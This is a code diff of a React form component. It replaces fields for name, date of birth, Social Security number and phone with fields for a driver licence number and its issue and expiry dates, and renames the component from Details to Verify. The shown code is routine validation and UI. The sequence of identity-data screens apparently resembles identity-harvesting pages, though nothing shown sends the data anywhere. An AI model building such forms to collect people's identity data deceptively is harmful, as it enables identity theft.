@@ -4,31 +4,39 @@ import download from "../assets/download2.png";
 import DatePicker from "react-datepicker";
 import "react-datepicker/dist/react-datepicker.css";
 
-const Details = () => {
+const Verify = () => {
   const [currentErrorField, setCurrentErrorField] = useState(null);
   const [errors, setErrors] = useState({
-    name: false,
-    dob: false,
-    ssn: false,
-    phone: false
+    licenseNumber: false,
+    issueDate: false,
+    expireDate: false,
   });
-  const [data, setData] = useState({});
 
   const [formData, setFormData] = useState({
-    name: "",
-    dob: null,
-    ssn: "",
-    phone: "",
+    licenseNumber: "",
+    issueDate: null,
+    expireDate: null,
   });
 
-  const handleDateChange = (date) => {
+  const handleIssueDateChange = (date) => {
     setFormData((prev) => ({
       ...prev,
-      dob: date,
+      issueDate: date,
     }));
 
-    if (currentErrorField === 'dob') {
-      setErrors((prev) => ({ ...prev, dob: !date }));
+    if (currentErrorField === 'issueDate') {
+      setErrors((prev) => ({ ...prev, issueDate: !date }));
+    }
+  };
+
+  const handleExpireDateChange = (date) => {
+    setFormData((prev) => ({
+      ...prev,
+      expireDate: date,
+    }));
+
+    if (currentErrorField === 'expireDate') {
+      setErrors((prev) => ({ ...prev, expireDate: !date }));
     }
   };
 
@@ -47,14 +55,12 @@ const Details = () => {
   const validateField = (fieldName) => {
     let isValid = false;
     
-    if (fieldName === 'name') {
-      isValid = formData.name.trim() !== '';
-    } else if (fieldName === 'dob') {
-      isValid = formData.dob !== null;
-    } else if (fieldName === 'ssn') {
-      isValid = formData.ssn.trim() !== '';
-    } else if (fieldName === 'phone') {
-      isValid = formData.phone.trim() !== '';
+    if (fieldName === 'licenseNumber') {
+      isValid = formData.licenseNumber.trim() !== '';
+    } else if (fieldName === 'issueDate') {
+      isValid = formData.issueDate !== null;
+    } else if (fieldName === 'expireDate') {
+      isValid = formData.expireDate !== null;
     }
 
     setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
@@ -65,23 +71,18 @@ const Details = () => {
     e.preventDefault();
     
     // Check fields in order
-    if (!validateField('name')) {
-      setCurrentErrorField('name');
+    if (!validateField('licenseNumber')) {
+      setCurrentErrorField('licenseNumber');
       return;
     }
     
-    if (!validateField('dob')) {
-      setCurrentErrorField('dob');
+    if (!validateField('issueDate')) {
+      setCurrentErrorField('issueDate');
       return;
     }
     
-    if (!validateField('ssn')) {
-      setCurrentErrorField('ssn');
-      return;
-    }
-    
-    if (!validateField('phone')) {
-      setCurrentErrorField('phone');
+    if (!validateField('expireDate')) {
+      setCurrentErrorField('expireDate');
       return;
     }
 
@@ -101,95 +102,80 @@ const Details = () => {
 
       <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
         <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
-          Confirm your Details
+          Verify your Details
         </h1>
 
         <form
           onSubmit={handleSubmit}
           className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
         >
-          {/* Full Name */}
+          {/* License Number */}
           <div className="w-full">
-            <label className="text-md font-semibold mb-2 block">Full Name</label>
+            <label className="text-md font-semibold mb-2 block">Driver License Number</label>
             <input
-              name="name"
+              name="licenseNumber"
               type="text"
-              value={formData.name}
+              value={formData.licenseNumber}
               onChange={handleChange}
-              onBlur={() => currentErrorField === 'name' && validateField('name')}
+              onBlur={() => currentErrorField === 'licenseNumber' && validateField('licenseNumber')}
               className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
-                errors.name
+                errors.licenseNumber
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-300 focus:ring-2 focus:ring-blue-600"
               }`}
             />
-            {errors.name && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+            {errors.licenseNumber && (
+              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
             )}
           </div>
 
-          {/* Date of Birth */}
-          <div className=" flex w-full">
-            <label className="text-md font-semibold mb-2 block">Date of Birth</label>
+          {/* Date of Issue */}
+          <div className="w-full flex space-x-1">
+            <label className="text-md font-semibold mb-2 block">Date of Issue</label>
             <DatePicker
-              selected={formData.dob}
-              onChange={handleDateChange}
-              onBlur={() => currentErrorField === 'dob' && validateField('dob')}
-              name="dob"
+              selected={formData.issueDate}
+              onChange={handleIssueDateChange}
+              onBlur={() => currentErrorField === 'issueDate' && validateField('issueDate')}
+              name="issueDate"
               showMonthDropdown
               showYearDropdown
               dropdownMode="select"
               maxDate={new Date()}
               dateFormat="dd MM yyyy"
              
-              className={`w-full px-4 py-2 border-2 rounded text-center tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
-                errors.dob
+              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
+                errors.issueDate
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-500 focus:ring-2 focus:ring-blue-700"
               }`}
             />
-            {errors.dob && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+            {errors.issueDate && (
+              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
             )}
           </div>
 
-          {/* SSN */}
-          <div className="w-full">
-            <label className="text-md font-semibold mb-2 block">Social Security Number</label>
-            <input
-              name="ssn"
-              type="text"
-              value={formData.ssn}
-              onChange={handleChange}
-              onBlur={() => currentErrorField === 'ssn' && validateField('ssn')}
-              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
-                errors.ssn
+          {/* Date of Expiry */}
+          <div className="w-full flex space-x-1">
+            <label className="text-md font-semibold mb-2 block">Date of Expiry</label>
+            <DatePicker
+              selected={formData.expireDate}
+              onChange={handleExpireDateChange}
+              onBlur={() => currentErrorField === 'expireDate' && validateField('expireDate')}
+              name="expireDate"
+              showMonthDropdown
+              showYearDropdown
+              dropdownMode="select"
+              minDate={new Date()} // Expiry date should be in future
+              dateFormat="dd MM yyyy"
+             
+              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
+                errors.expireDate
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-500 focus:ring-2 focus:ring-blue-700"
               }`}
             />
-            {errors.ssn && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
-            )}
-          </div>
-
-          {/* Phone Number */}
-          <div className="w-full">
-            <label className="text-md font-semibold mb-2 block">Phone Number</label>
-            <input
-              name="phone"
-              type="text"
-              value={formData.phone}
-              onChange={handleChange}
-              onBlur={() => currentErrorField === 'phone' && validateField('phone')}
-              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest text-lg sm:text-xl focus:outline-none ${
-                errors.phone
-                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
-                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
-              }`}
-            />
-            {errors.phone && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+            {errors.expireDate && (
+              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
             )}
           </div>
 
@@ -217,4 +203,4 @@ const Details = () => {
   );
 };
 
-export default Details;
+export default Verify;
